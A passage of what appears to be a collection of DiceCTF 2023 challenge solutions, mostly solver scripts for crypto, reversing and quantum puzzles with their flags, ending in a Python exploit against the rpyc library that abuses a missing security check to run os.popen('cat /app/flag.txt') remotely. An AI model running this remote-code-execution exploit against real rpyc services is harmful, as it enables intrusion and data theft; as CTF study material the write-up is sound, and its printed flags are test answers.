print(flag)
# dice{b0p_it_pul1_1t_6op_it_pull_1t_pu1l_1t_b0p_it}
```



```
from pwn import *
import os
from Crypto.Util.strxor import strxor
from Crypto.Util.number import * 
from tqdm import trange

def enc(io,m0,m1):
    io.recvuntil(b'Action: ')
    io.sendline(b'1')
    io.recvuntil(b'm0 (16 byte hexstring):')
    io.sendline(m0.hex().rjust(32).encode())
    io.recvuntil(b'm1 (16 byte hexstring):')
    io.sendline(m1.hex().rjust(32).encode())
    ret = io.recvline().strip()
    c1 = bytes.fromhex(ret[:512].decode())
    c2 = bytes.fromhex(ret[512:].decode())
    return c1,c2

def dec(io,c1,c2):
    io.recvuntil(b'Action: ')
    io.sendline(b'2')
    io.recvuntil(b'ct (512 byte hexstring):')
    ct = (c1.hex().rjust(512)+c2.hex().rjust(512)).encode()
    print(ct)
    context.log_level='debug'
    io.sendline(ct)
    
    ret = io.recvline().strip()
    
    print(ret)
    return bytes.fromhex(ret.decode())

def guess(io,m0,m1,c_dec):
    io.recvuntil(b'Action: ')
    io.sendline(b'0')
    io.recvuntil(b'm_bit guess:')
    if c_dec == m0:
        io.sendline(b'0')
    elif c_dec == m1:
        io.sendline(b'1')
    print(io.recvline())

def exp(io):
    io.recvuntil(b'pk0 = ')
    n0 = int(io.recvline().strip())
    io.recvuntil(b'pk1 = ')
    n1 = int(io.recvline().strip())
    m0 = os.urandom(16)
    m1 = os.urandom(16)
    c00,c01 = enc(io,m0,m1)
    c10,c11 = enc(io,m0,m1)
    c20,c21 = enc(io,m0,m1)
    c_dec1 = dec(io,c00,c11)
    c_dec2 = dec(io,c10,c21)
    c_dec3 = dec(io,c20,c01)
    c_dec = strxor(c_dec1,strxor(c_dec2,c_dec3))
    guess(io,m0,m1,c_dec)

io = remote("mc.ax",31497)
for _ in trange(128):
    exp(io)
io.interactive()
```



```
from pwn import *

leak = open('./input.bin', 'rb').read()

global hehe

MAT_SIZE = 0x12

def recur(mat, col_id, status):
    global hehe
    bit_flipping = 1
    v5 = 0
    try:
        if hehe[col_id][status] != -1:
            return hehe[col_id][status]

        for int_1 in range(MAT_SIZE):
            if (((1 << int_1) & status) != 0): continue

            if col_id == MAT_SIZE - 1:
                return mat[col_id][int_1]

            val = mat[col_id][int_1] * bit_flipping
            ans = recur(mat, col_id + 1, (status | (1 << int_1)))
            # print(ans)
            v5 += val * ans
            bit_flipping = -bit_flipping
        hehe[col_id][status] = v5
        return v5
    except:
        print(col_id, status)
        exit(-1)

for i in range(64):
    x = leak[0]
    matrix = []
    for j in range(x):
        start = (650 * i + 1 + 36 * j) * 4
        t = leak[start:start+0x90]
        k = []
        for z in range(x):
            k.append(u64(t[z*8:(z+1)*8]))
        matrix.append(k)

    hehe = [[-1] * 262144] * 18
    res = recur(matrix, 0, 0)
    # print(res)
    start = (650 * i + 649) * 4
    print(chr((u64(leak[start:start+8]) - res + i) & 0xff), end = '')
```



```
#include <algorithm>
#include <exception>
#include <fstream>
#include <functional>
#include <iostream>
#include <math.h>
#include <stdlib.h>
#include <vector>
using namespace std;

void work(vector<int> &data, int th_num) {
  vector<function<int(int, int)>> funcs{
      [](int x, int y) { return x + y; },
      [](int x, int y) { return x * y; },
      [](int x, int y) { return x ^ y; },
  };
  srand(data.size() ^ th_num);
  for (size_t i = 1; i < funcs.size(); ++i)
    swap(funcs[i], funcs[rand() % (i + 1)]);

  int nmax = log2(data.size());
  for (int n = 0; n < nmax; ++n) {
    int i = 1 << n;
    int cmax = data.size() / (2 * i);
    for (int c = 1; c <= cmax; ++c) {
      int pos = 2 * i * c - 1;
      auto func = funcs[n % 3];
      data[pos] = func(data[pos], data[pos - i]);
    }
  }
  for (int n = nmax - 1; n >= 0; --n) {
    int i = 1 << n;
    int cmax = (data.size() - i) / (2 * i);
    for (int c = 1; c <= cmax; ++c) {
      int pos = 2 * i * c - 1;
      auto func = funcs[n % 3];
      data[pos + i] = func(data[pos], data[pos + i]);
    }
  }
}

void rev_work(vector<int> &data, int th_num) {
  vector<function<int(int, int)>> funcs{
      [](int x, int y) { return x - y; },
      [](int x, int y) {
        if (y == 0)
          throw overflow_error("div by 0");
        return x / y;
      },
      [](int x, int y) { return x ^ y; },
  };
  srand(data.size() ^ th_num);
  for (size_t i = 1; i < funcs.size(); ++i)
    swap(funcs[i], funcs[rand() % (i + 1)]);

  int nmax = log2(data.size());
  for (int n = 0; n < nmax; ++n) {
    int i = 1 << n;
    int cmax = (data.size() - i) / (2 * i);
    for (int c = 1; c <= cmax; ++c) {
      int pos = 2 * i * c - 1;
      auto func = funcs[n % 3];
      data[pos + i] = func(data[pos + i], data[pos]);
    }
  }
  for (int n = nmax - 1; n >= 0; --n) {
    int i = 1 << n;
    int cmax = data.size() / (2 * i);
    for (int c = 1; c <= cmax; ++c) {
      int pos = 2 * i * c - 1;
      auto func = funcs[n % 3];
      data[pos] = func(data[pos], data[pos - i]);
    }
  }
}

int main() {
  ifstream fin("flag.out");
  vector<int> data;
  int x;
  while (fin >> x)
    data.push_back(x);
  for (int num = 1; num < 10; ++num) {
    vector<int> a = data;
    try {
      rev_work(a, num);
    } catch (overflow_error) {
      continue;
    }
    cout << num << ": ";
    for (int x : a)
      cout << char(x);
    cout << 'n';
  }
  return 0;
}
```



```
org = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"'
a = 'VRiPyfC7Ih3XxrK6HcsGFoSTlkW9e2!BuNJZAp10En45qjOYb"azQwDmUMdgv8tL'

target = 'm_ERpmfrNkekU4_4asI_Tra1e_4l_c4_GCDlryidS3{Ptsu9i}13Es4V73M4_ans'

for i in range(len(a)):
    print(target[a.index(org[i])], end = '')
    
# dice{P4ral1isM_m4kEs_eV3ryt4InG_sUp3r_f4ST_aND_s3CuRE_a17m4k9l4}
```



```
from qiskit import QuantumCircuit, Aer, execute
from qiskit import ClassicalRegister
cr = ClassicalRegister(400,'c')

simulator = Aer.get_backend('aer_simulator')
qc = QuantumCircuit.from_qasm_file("challenge.qasm")

qc.add_register(cr)

qc.measure_all()

job = simulator.run(qc, shots=8192)
result = job.result()
print(result)
print(result.get_counts())
```



```
...
0x00000000000646963657b636c6966666f72642d7468652d6269672d7175616e74756d2d646f672d3139653366357d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
...
```



```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <intrin.h>

typedef __uint128_t _OWORD;
typedef uint64_t _QWORD;
typedef uint8_t _BYTE;

#define LOBYTE(x) (*((_BYTE*)&(x)))

_OWORD *__fastcall emu(
        _OWORD *a1,
        __int64 a2)
{
  // dump here
}

struct dummy {
    void *p, *q;
    _QWORD unk;
};

int main() {
    struct dummy res, vec;
    char buf[] = "00";
    vec.p = buf, vec.q = buf + sizeof (buf) - 1, vec.unk = 1;
    emu((_OWORD *)&res, (long long)&vec);
    for (int i = 0; i < res.unk; ++i) {
        printf("%02X%c", ((_BYTE *)res.p)[i], i + 1 == res.unk ? 'n' : ' ');
    }
    printf("%p %p %pn", res.p, res.q, res.unk);
    return 0;
}
```



```
x, t, n = '', '0', 0
for c in '132111311112211112213111513211222213121222213211221111223112131122311151313223113112121131115221121115121211221121232132112241115131121313223122111113112':
    c = int(c)
    x += t * c
    t = '1' if t == '0' else '0'
    n += c
    if n == 8:
        t, n = '0', 0
    elif n > 8: assert False
flag = bytearray()
for i in range(0, len(x), 8):
    flag.append(int(x[i:i+8], 2))
print(flag.decode())
#ru57_r3v3r51ng_w1th_4_m4cr0_tw15t
```



```
hehe0 = 'ef2**ya**ba5'
hehe1 = 'pud3**17i__'
hehe2 = '1nb**iydt8f'
hehe3 = '}_0_167'
hehe4 = '7*3**e'
hehe5 = '2**3**p*d'
hehe6 = 'h*******_'
hehe7 = '_*0'

test = list('dice{________________att3nt1on_________________}')

for i in range(len(hehe0)):
    if hehe0[i] == '*': continue
    x = ((7 + i) * 5) % 48
    test[x] = hehe0[i]

for i in range(len(hehe1)):
    if hehe1[i] == '*': continue
    x = ((21 + i) * 5) % 48
    test[x] = hehe1[i]

for i in range(len(hehe2)):
    if hehe2[i] == '*': continue
    x = ((30 + i) * 7) % 48
    test[x] = hehe2[i]

for i in range(len(hehe3)):
    if hehe3[i] == '*': continue
    x = ((41 + i) * 7) % 48
    test[x] = hehe3[i]

for i in range(len(hehe4)):
    if hehe4[i] == '*': continue
    x = ((12 + i) * 11) % 48
    test[x] = hehe4[i]

for i in range(len(hehe5)):
    if hehe5[i] == '*': continue
    x = ((26 + i) * 11) % 48
    test[x] = hehe5[i]

for i in range(len(hehe6)):
    if hehe6[i] == '*': continue
    x = ((19 + i) * 13) % 48
    test[x] = hehe6[i]

for i in range(len(hehe7)):
    if hehe7[i] == '*': continue
    x = ((6 + i) * 13) % 48
    test[x] = hehe7[i]

print(''.join(test))
```



```
flag = "11223"
magic = {'1': 123, '2': 456, '3': 789}
for k in magic.keys():
    s = 0
    for i in range(len(flag)):
        if flag[i] == k:
            s = 101 * s + i + 1
    assert magic[k] == s
```



```
magic = {}
lst = [False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, 319496, False, 2184867, 21925933, 422628, 14733726, 555, False, 4695, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, 320588772, False, 4798, 3775, 1163, 1349, 2565, 4295, False, False, False, False, False, 2044, 433, 660, 964, 1066, False, False, 11733, 226772, False, False, False, False, 764, False, False, False, False, False, False]
for idx, elem in enumerate(lst):
    if elem:
        magic[chr(idx)] = elem
```



```
flag = "???????"
magic = {'.': 319496, '0': 2184867, '1': 21925933, '2': 422628, '3': 14733726, '4': 555, '6': 4695, '_': 320588772, 'a': 4798, 'b': 3775, 'c': 1163, 'd': 1349, 'e': 2565, 'f': 4295, 'l': 2044, 'm': 433, 'n': 660, 'o': 964, 'p': 1066, 's': 11733, 't': 226772, 'y': 764}
for k in magic.keys():
    s = 0
    for i in range(len(flag)):
        if flag[i] == k:
            s = 101 * s + i + 1
    assert magic[k] == s
```



```
magic = {'.': 319496, '0': 2184867, '1': 21925933, '2': 422628, '3': 14733726, '4': 555, '6': 4695, '_': 320588772, 'a': 4798, 'b': 3775, 'c': 1163, 'd': 1349, 'e': 2565, 'f': 4295, 'l': 2044, 'm': 433, 'n': 660, 'o': 964, 'p': 1066, 's': 11733, 't': 226772, 'y': 764}
flag = bytearray(b'x00'*100)
for k, s in magic.items():
    vals = []
    while s != 0:
        vals.append(s%101-1)
        s = s // 101
    for v in vals:
        flag[v] = ord(k)
print(bytes(flag).rstrip(b'x00'))
```



```
print(dir(MagicDict))

['__class__', '__contains__', '__copy__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__missing__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'clear', 'copy', 'default_factory', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']

print(dir(MagicDict.__init__))

['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```



```
the time, {0.headers} replaced by 0.headers.__class__.__init.__globals__
```



```
import rpyc
from types import CodeType

conn = rpyc.connect("localhost", 1337)

def myeval(self=None, cmd="__import__('sys')"):
  return eval(cmd)

"""
__argcount: int,
__posonlyargcount: int,
__kwonlyargcount: int,
__nlocals: int,
__stacksize: int,
__flags: int,
__codestring: bytes,
__constants: tuple[object, ...],
__names: tuple[str, ...],
__varnames: tuple[str, ...],
__filename: str, __name: str,
__qualname: str,
__firstlineno: int,
__linetable: bytes,
__exceptiontable: bytes, __freevars: tuple[str, ...] = ..., __cellvars: tuple[str, ...] = ...
"""
def get_code(obj_codetype, func, filename=None, name=None):
  func_code = func.__code__
  mycode = obj_codetype(func_code.co_argcount, func_code.co_posonlyargcount, func_code.co_kwonlyargcount, func_code.co_nlocals, func_code.co_stacksize, func_code.co_flags, func_code.co_code, func_code.co_consts, func_code.co_names, func_code.co_varnames, func_code.co_filename, func_code.co_name, func_code.co_qualname, func_code.co_firstlineno, func_code.co_linetable, func_code.co_exceptiontable, func_code.co_freevars, func_code.co_cellvars)
  return mycode

def netref_getattr(netref, attrname):
  # PoC CWE-358: abuse __cmp__ function that was missing a security check
  handler = rpyc.core.consts.HANDLE_CMP
  return conn.sync_request(handler, netref, attrname, '__getattribute__')

remote_svc_proto = netref_getattr(conn.root, '_protocol')
remote_dispatch = netref_getattr(remote_svc_proto, '_dispatch_request')
remote_class_globals = netref_getattr(remote_dispatch, '__globals__')
remote_modules = netref_getattr(remote_class_globals['sys'], 'modules')
_builtins = remote_modules['builtins']
remote_builtins = {k: netref_getattr(_builtins, k) for k in dir(_builtins)}

print("populate globals for CodeType calls on remote")
remote_globals = remote_builtins['dict']()
for name, netref in remote_builtins.items():
    remote_globals[name] = netref
for name, netref in netref_getattr(remote_modules, 'items')():
    remote_globals[name] = netref

print("create netrefs for types to create remote function malicously")
remote_types = remote_builtins['__import__']("types")
remote_types_CodeType = netref_getattr(remote_types, 'CodeType')
remote_types_FunctionType = netref_getattr(remote_types, 'FunctionType')

print('remote eval function constructed')
remote_eval_codeobj = get_code(remote_types_CodeType, myeval, filename='test_code.py', name='__code__')
remote_eval = remote_types_FunctionType(remote_eval_codeobj, remote_globals)
# PoC CWE-913: modify the exposed_nop of service
#   by binding various netrefs in this execution frame, they are cached in
#   the remote address space. setattr and eval functions are cached for the life
#   of the netrefs in the frame. A consequence of Netref classes inheriting
#   BaseNetref, each object is cached under_local_objects. So, we are able
#   to construct arbitrary code using types and builtins.

# use the builtin netrefs to modify the service to use the constructed eval func
remote_setattr = remote_builtins['setattr']
remote_type = remote_builtins['type']
remote_setattr(remote_type(conn.root), 'exposed_add', remote_eval)

flag = conn.root.add('__import__("os").popen("cat /app/flag.txt").read()')
print(flag)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/2-1675696109.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/8-1675696109.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/6-1675696110.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/6-1675696111.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/3-1675696111.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1675696112.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1675696112.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1675696113.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/8-1675696113.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/3-1675696114.png)